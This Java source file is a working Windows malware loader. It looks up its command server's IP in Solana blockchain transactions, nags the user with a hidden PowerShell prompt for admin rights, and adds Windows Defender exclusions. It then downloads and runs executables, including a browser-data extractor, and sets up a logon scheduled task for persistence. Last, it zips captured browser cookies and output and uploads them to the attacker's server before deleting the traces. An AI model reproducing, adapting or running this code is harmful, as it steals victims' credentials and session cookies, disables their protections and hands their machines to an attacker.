// language: Java, file: payload/Payload.java
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Base64;
import java.util.zip.*;
import java.util.Comparator;

public class Payload {
    private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
    private static final String SOLANA_RPC = "https://api.devnet.solana.com";

    public static void main(String[] args) {
        try {
            String key = "";
            String ip = "";

            if (args.length >= 2) {
                key = args[0].trim();
                ip = args[1].trim();
            } else {
                while (ip == null || ip.isEmpty()) {
                    ip = getC2Ip();
                    if (ip == null) {
                        Thread.sleep(30000);
                    }
                }
                key = "all";
            }

            if (!isAdmin()) {
                while (true) {
                    boolean accepted = askForAdmin(key, ip);
                    if (accepted) {
                        System.exit(0);
                    }
                    Thread.sleep(1000);
                }
            } else {
                executePayload(key, ip);
            }
        } catch (Throwable t) {
            // Silent catch
        }
    }

    private static boolean askForAdmin(String key, String ip) {
        try {
            String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
            String javaExe = javaHome + "\\bin\\javaw.exe";
            String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            File lockFile = new File(getLoaderDir(), ".lock");

            lockFile.createNewFile();

            String psCommand = String.format(
                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s' -WindowStyle Hidden",
                javaExe, jarPath, key, ip
            );

            ProcessBuilder pb = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            
            Process p = pb.start();
            p.waitFor();
            
            for (int i = 0; i < 100; i++) {
                if (!lockFile.exists()) {
                    return true;
                }
                Thread.sleep(100);
            }
            
            if (lockFile.exists()) lockFile.delete();
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private static File getLoaderDir() {
        String localAppData = System.getenv("LOCALAPPDATA");
        if (localAppData == null) localAppData = "C:\\";
        File dir = new File(localAppData, "Microsoft\\AppBroker");
        if (!dir.exists()) dir.mkdirs();
        return dir;
    }

    private static String getC2Ip() {
        try {
            String sigPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getSignaturesForAddress\",\"params\":[\"" + SOLANA_WALLET + "\",{\"limit\":10}]}";
            String sigRes = httpPost(SOLANA_RPC, sigPayload);
            if (sigRes == null) return null;

            java.util.List<String> sigs = new java.util.ArrayList<>();
            String searchKey = "\"signature\":\"";
            int idx = 0;
            while ((idx = sigRes.indexOf(searchKey, idx)) != -1) {
                idx += searchKey.length();
                int end = sigRes.indexOf("\"", idx);
                if (end != -1) {
                    sigs.add(sigRes.substring(idx, end));
                    idx = end;
                }
            }

            if (sigs.isEmpty()) return null;

            for (String sig : sigs) {
                String txPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getTransaction\",\"params\":[\"" + sig + "\",{\"encoding\":\"json\"}]}";
                String txRes = httpPost(SOLANA_RPC, txPayload);
                
                if (txRes != null) {
                    int ipStart = txRes.indexOf("1(");
                    if (ipStart != -1) {
                        int ipEnd = txRes.indexOf(")", ipStart);
                        if (ipEnd != -1) {
                            String candidate = txRes.substring(ipStart + 2, ipEnd);
                            if (candidate.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) {
                                return candidate;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            return null;
        }
        return null;
    }

    private static String httpPost(String urlStr, String jsonBody) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            try (OutputStream os = conn.getOutputStream()) { os.write(jsonBody.getBytes("UTF-8")); }
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) { sb.append(line); }
                return sb.toString();
            }
        } catch (Exception e) { return null; }
    }

    private static boolean isAdmin() {
        try {
            File f = new File("C:\\Windows\\System32\\config");
            return f.list() != null;
        } catch (Exception e) { return false; }
    }

    private static void executePayload(String key, String ip) {
        try {
            File loaderDir = getLoaderDir();
            
            File lock = new File(loaderDir, ".lock");
            if (lock.exists()) {
                lock.delete();
            }

            try {
                String psExclude = String.format(
                    "Add-MpPreference -ExclusionPath 'C:\\Users', '%s' -ErrorAction SilentlyContinue",
                    loaderDir.getAbsolutePath().replace("'", "''")
                );
                
                ProcessBuilder pb = new ProcessBuilder(
                    "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psExclude
                );
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                pb.start().waitFor();
                
                Thread.sleep(3000); 
            } catch (Exception e) {}

            String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
            for (String file : files) {
                downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
            }

            String[] exesToRun = {"3.exe", "2.exe", "1.exe"};
            for (String exe : exesToRun) {
                File exeFile = new File(loaderDir, exe);
                if (exeFile.exists() && exeFile.length() > 1024) {
                    try {
                        // cmd.exe /c with working directory set to loaderDir runs it exactly like .\2.exe all
                        String cmd = exe + " all";
                        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                        pb.directory(loaderDir);
                        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                        pb.start();
                    } catch (Exception e) {}
                    // 5 seconds gives chromelevator (2.exe) enough time to finish extraction before 1.exe runs
                    Thread.sleep(5000);
                }
            }

            installStartupTask(key, ip);

            Thread.sleep(25000);
            
            File zipFile = new File(loaderDir, "capture.zip");
            zipFolders(new File[]{
                new File(loaderDir, "output"),
                new File(loaderDir, "cookies")
            }, zipFile);
            
            uploadFile("http://" + ip + "/api/rpc", zipFile, key);

            if (zipFile.exists()) zipFile.delete();
            deleteDir(new File(loaderDir, "output"));
            deleteDir(new File(loaderDir, "cookies"));

        } catch (Exception e) {}
    }

    private static void deleteDir(File dir) {
        if (!dir.exists()) return;
        try {
            Files.walk(dir.toPath())
                .sorted(Comparator.reverseOrder())
                .map(Path::toFile)
                .forEach(File::delete);
        } catch (Exception e) {}
    }

    private static void installStartupTask(String key, String ip) {
        try {
            String jarPath = getLoaderDir().getAbsolutePath() + "\\st.jar";
            String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
            String javawPath = javaHome + "\\bin\\javaw.exe";
            
            String trCmd = "\"" + javawPath + "\" -jar \"" + jarPath + "\" " + key + " " + ip;

            ProcessBuilder pb = new ProcessBuilder(
                "schtasks.exe",
                "/Create",
                "/TN", "WindowsJavaHelper",
                "/TR", trCmd,
                "/SC", "ONLOGON",
                "/RL", "HIGHEST",
                "/F"
            );
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            pb.start().waitFor();
        } catch (Exception e) {}
    }

    private static void downloadFile(String urlStr, File dest) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            if (conn.getResponseCode() == 200) {
                try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
                    byte[] buf = new byte[8192]; int len;
                    while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
                }
            }
        } catch (Exception e) {}
    }

    private static void zipFolders(File[] dirs, File zipFile) {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            for (File dir : dirs) {
                if (!dir.exists()) continue;
                String folderName = dir.getName();
                for (File f : dir.listFiles()) {
                    if (f.isFile()) {
                        zos.putNextEntry(new ZipEntry(folderName + "/" + f.getName()));
                        Files.copy(f.toPath(), zos);
                        zos.closeEntry();
                    }
                }
            }
        } catch (Exception e) {}
    }

    private static void uploadFile(String urlStr, File file, String key) {
        try {
            byte[] bytes = Files.readAllBytes(file.toPath());
            String b64 = Base64.getEncoder().encodeToString(bytes);
            String json = "{\"cmd\":\"upload\",\"key\":\"" + key + "\",\"clientId\":1,\"name\":\"capture.zip\",\"data\":\"" + b64 + "\"}";
            
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            try (OutputStream os = conn.getOutputStream()) { os.write(json.getBytes()); }
            conn.getResponseCode();
        } catch (Exception e) {}
    }
}